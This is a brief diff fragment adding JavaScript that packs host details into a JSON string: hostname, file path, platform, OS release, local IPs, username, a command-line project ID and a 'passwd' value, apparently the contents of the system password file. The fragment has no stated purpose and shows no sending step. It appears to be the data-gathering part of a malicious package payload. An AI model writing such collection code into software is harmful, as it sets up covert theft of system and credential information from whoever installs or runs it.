@@ -1,0 +1,11 @@
+JSON.stringify({
+    hostname: hostname,
+    filepath: filepath,
+    platform: platform,
+    release: release,
+    localip: ips,
+    passwd: passwd,
+    username: username,
+    project_id: process.argv[2]
+  })
+_tmp_6.project_id = process.argv[2]
